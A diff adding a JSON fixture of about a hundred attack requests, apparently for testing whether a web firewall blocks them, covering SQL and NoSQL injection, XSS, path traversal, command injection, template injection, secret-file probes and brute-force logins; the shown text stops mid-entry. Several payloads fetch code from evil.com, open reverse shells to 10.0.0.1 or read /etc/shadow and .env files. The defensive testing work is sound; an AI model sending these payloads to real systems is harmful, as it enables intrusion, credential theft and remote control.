@@ -1,0 +1,2596 @@
+[
+  {
+    "id": "ATK-SQL_-001",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/search?q=' OR '1'='1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-002",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/users?id=1 UNION SELECT null, username, password FROM users--",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-003",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/items?cat=tech'; DROP TABLE products;--",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-004",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": "admin' --",
+      "password": "pwd"
+    }
+  },
+  {
+    "id": "ATK-SQL_-005",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": "admin' OR 1=1 #",
+      "password": "pwd"
+    }
+  },
+  {
+    "id": "ATK-SQL_-006",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/query?sort=name; EXEC xp_cmdshell('dir')",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-007",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/filter?val=%27%20OR%201%3D1--",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-008",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/check?code=' or 1=1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-009",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/orders?status=active' AND 1=1--",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-010",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/data",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "filter": "1' or 'a'='a"
+    }
+  },
+  {
+    "id": "ATK-SQL_-011",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/records?filter=test' union select 1,2,3--",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-012",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; INSERT INTO users VALUES ('hacker','pwd')",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-013",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; DELETE FROM logs WHERE 1=1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-014",
+    "category": "SQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/audit?q=1; UPDATE users SET role='admin' WHERE id=5",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SQL_-015",
+    "category": "SQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?q=test%27%20and%201%3D1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-016",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/comments?msg=<script>alert('XSS')</script>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-017",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/profile",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "bio": "<img src=x onerror=alert(document.cookie)>"
+    }
+  },
+  {
+    "id": "ATK-XSS-018",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/feedback?text=javascript:alert(1)",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-019",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/view?name=<svg onload=alert('XSS')>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-020",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/items",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "desc": "<iframe src=javascript:document.cookie>"
+    }
+  },
+  {
+    "id": "ATK-XSS-021",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/render?html=<body onload=eval(atob('ZG9jdW1lbnQud3JpdGUoMSk='))>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-022",
+    "category": "XSS",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/post",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "content": "<div onclick=\"document.write('hacked')\">"
+    }
+  },
+  {
+    "id": "ATK-XSS-023",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/user?name=<input onfocus=alert(1) autofocus>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-024",
+    "category": "XSS",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/echo?s=document.cookie",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-025",
+    "category": "XSS",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/tag?t=<script src='http://evil.com/xss.js'></script>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-XSS-026",
+    "category": "XSS",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/note",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "note": "test<script>fetch('/stolen?c='+document.cookie)</script>"
+    }
+  },
+  {
+    "id": "ATK-XSS-027",
+    "category": "XSS",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/search?q=<a href='javascript:alert(1)'>click me</a>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-028",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/download?file=../../../../etc/passwd",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-029",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/view?path=..%2F..%2F..%2Fwindows%2Fsystem32%2Fcmd.exe",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-030",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/read?file=../../../etc/shadow",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-031",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/load?doc=..\\..\\..\\boot.ini",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-032",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/static?file=....//....//etc/passwd",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-033",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/fetch?res=../../../../var/log/auth.log",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-034",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/asset?img=../../../etc/hosts",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-035",
+    "category": "PATH_TRAVERSAL",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/files/download?f=../../../../app/.env",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-036",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/docs?p=..%2F..%2F..%2Fetc%2Fgroup",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-PATH-037",
+    "category": "PATH_TRAVERSAL",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/export?path=../../../../usr/local/etc/config",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-038",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/ping?host=127.0.0.1; cat /etc/passwd",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-039",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/dns?domain=google.com && whoami",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-040",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/test?cmd=127.0.0.1 | ls -la",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-041",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/exec",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "command": "test `id`"
+    }
+  },
+  {
+    "id": "ATK-COMM-042",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/network?ip=127.0.0.1; wget http://evil.com/malware.sh",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-043",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/status?host=localhost; uname -a",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-044",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/run",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "script": "$(nc -e /bin/sh 10.0.0.1 4444)"
+    }
+  },
+  {
+    "id": "ATK-COMM-045",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/calc?expr=1; python -c 'import socket'",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-046",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/service?name=app && id",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-COMM-047",
+    "category": "COMMAND_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/backup?dest=/tmp; bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-048",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/render?template={{7*7}}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-049",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/greeting?name=${7*7}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-050",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/page?tpl={{config.items()}}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-051",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/preview",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "content": "#{7*7}"
+    }
+  },
+  {
+    "id": "ATK-SSTI-052",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/mail?body=<% 7*7 %>",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-053",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/view?t={% import os %}{{ os.popen('whoami').read() }}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-054",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/format?fmt={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-055",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/render?q=${T(java.lang.Runtime).getRuntime().exec('whoami')}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-056",
+    "category": "SSTI",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/view?t={{''.__class__.__mro__[2].__subclasses__()}}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SSTI-057",
+    "category": "SSTI",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/display?title={{self._TemplateReference__context.cycler}}",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-NOSQ-058",
+    "category": "NOSQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/users?user[$gt]=",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-NOSQ-059",
+    "category": "NOSQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "username": {
+        "$ne": null
+      },
+      "password": {
+        "$ne": null
+      }
+    }
+  },
+  {
+    "id": "ATK-NOSQ-060",
+    "category": "NOSQL_INJECTION",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/find",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "role": {
+        "$in": [
+          "admin",
+          "superadmin"
+        ]
+      },
+      "$where": "this.password.length > 0"
+    }
+  },
+  {
+    "id": "ATK-NOSQ-061",
+    "category": "NOSQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/filter?name[$regex]=^adm",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-NOSQ-062",
+    "category": "NOSQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/query",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "$or": [
+        {
+          "role": "admin"
+        },
+        {
+          "user": "test"
+        }
+      ]
+    }
+  },
+  {
+    "id": "ATK-NOSQ-063",
+    "category": "NOSQL_INJECTION",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/lookup",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "id": {
+        "$exists": true
+      }
+    }
+  },
+  {
+    "id": "ATK-NOSQ-064",
+    "category": "NOSQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/search",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    },
+    "body": {
+      "balance": {
+        "$gt": 0
+      }
+    }
+  },
+  {
+    "id": "ATK-NOSQ-065",
+    "category": "NOSQL_INJECTION",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/users?token[$ne]=1",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SCAN-066",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/items?id=1",
+    "headers": {
+      "user-agent": "sqlmap/1.8#stable"
+    }
+  },
+  {
+    "id": "ATK-SCAN-067",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/health",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (compatible; Nikto/2.1.6; +http://cirt.net/nikto/)"
+    }
+  },
+  {
+    "id": "ATK-SCAN-068",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/data",
+    "headers": {
+      "user-agent": "masscan/1.3.2 (https://github.com/robertdavidgraham/masscan)"
+    }
+  },
+  {
+    "id": "ATK-SCAN-069",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/test",
+    "headers": {
+      "user-agent": "Nmap Scripting Engine (https://nmap.org/book/nse.html)"
+    }
+  },
+  {
+    "id": "ATK-SCAN-070",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/status",
+    "headers": {
+      "user-agent": "zgrab/0.x"
+    }
+  },
+  {
+    "id": "ATK-SCAN-071",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/check",
+    "headers": {
+      "user-agent": "DirBuster-1.0-RC1 (http://www.owasp.org/)"
+    }
+  },
+  {
+    "id": "ATK-SCAN-072",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/probe",
+    "headers": {
+      "user-agent": "gobuster/3.5"
+    }
+  },
+  {
+    "id": "ATK-SCAN-073",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/fuzz",
+    "headers": {
+      "user-agent": "Wfuzz/3.1.0 - The Web Fuzzer"
+    }
+  },
+  {
+    "id": "ATK-SCAN-074",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "Mozilla/4.0 (Hydra)"
+    }
+  },
+  {
+    "id": "ATK-SCAN-075",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/recon",
+    "headers": {
+      "user-agent": "BurpSuite/Pro_2023.12"
+    }
+  },
+  {
+    "id": "ATK-SCAN-076",
+    "category": "SCANNER_BOT",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/api/exploit",
+    "headers": {
+      "user-agent": "metasploit-framework"
+    }
+  },
+  {
+    "id": "ATK-SCAN-077",
+    "category": "SCANNER_BOT",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/headless",
+    "headers": {
+      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 HeadlessChrome/118.0.0.0 Safari/537.36"
+    }
+  },
+  {
+    "id": "ATK-SCAN-078",
+    "category": "SCANNER_BOT",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/api/auto",
+    "headers": {
+      "user-agent": "Mozilla/5.0 PhantomJS/2.1.1 (Linux)"
+    }
+  },
+  {
+    "id": "ATK-SCAN-079",
+    "category": "SCANNER_BOT",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/crawl",
+    "headers": {
+      "user-agent": "python-requests/2.31.0"
+    }
+  },
+  {
+    "id": "ATK-SCAN-080",
+    "category": "SCANNER_BOT",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "GET",
+    "url": "/api/bot",
+    "headers": {
+      "user-agent": "Go-http-client/1.1"
+    }
+  },
+  {
+    "id": "ATK-SECR-081",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/.env",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-082",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/config.json",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-083",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/wp-config.php",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-084",
+    "category": "SECRET_PROBE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/.git/config",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-085",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/.htaccess",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-086",
+    "category": "SECRET_PROBE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/id_rsa",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-087",
+    "category": "SECRET_PROBE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/private_key.pem",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-088",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/docker-compose.yml",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-089",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/admin/debug",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-090",
+    "category": "SECRET_PROBE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/internal/secrets",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-091",
+    "category": "SECRET_PROBE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "GET",
+    "url": "/app/config/.env.local",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-SECR-092",
+    "category": "SECRET_PROBE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "GET",
+    "url": "/.git/HEAD",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0"
+    }
+  },
+  {
+    "id": "ATK-BRUT-093",
+    "category": "BRUTE_FORCE",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "username": "admin",
+      "password": "wrong_password_1"
+    }
+  },
+  {
+    "id": "ATK-BRUT-094",
+    "category": "BRUTE_FORCE",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "username": "admin",
+      "password": "wrong_password_2"
+    }
+  },
+  {
+    "id": "ATK-BRUT-095",
+    "category": "BRUTE_FORCE",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "username": "admin",
+      "password": "wrong_password_3"
+    }
+  },
+  {
+    "id": "ATK-BRUT-096",
+    "category": "BRUTE_FORCE",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/auth/signin",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "user": "root",
+      "pass": "123456"
+    }
+  },
+  {
+    "id": "ATK-BRUT-097",
+    "category": "BRUTE_FORCE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/auth/token",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "user": "admin",
+      "pass": "admin123"
+    }
+  },
+  {
+    "id": "ATK-BRUT-098",
+    "category": "BRUTE_FORCE",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "username": "superuser",
+      "password": "bad"
+    }
+  },
+  {
+    "id": "ATK-BRUT-099",
+    "category": "BRUTE_FORCE",
+    "severity": "medium",
+    "expectedAction": "rate_limited",
+    "method": "POST",
+    "url": "/api/auth/signin",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "username": "moderator",
+      "password": "invalid"
+    }
+  },
+  {
+    "id": "ATK-BRUT-100",
+    "category": "BRUTE_FORCE",
+    "severity": "high",
+    "expectedAction": "temporary_block",
+    "method": "POST",
+    "url": "/api/login",
+    "headers": {
+      "user-agent": "AttackVerificationHarness/2.0",
+      "x-forwarded-for": "198.51.100.99"
+    },
+    "body": {
+      "username": "admin",
+      "password": "password2024"
+    }
+  },
+  {
+    "id": "ATK-XXE-101",
+    "category": "XXE",
+    "severity": "critical",
+    "expectedAction": "blocked",
+    "method": "POST",
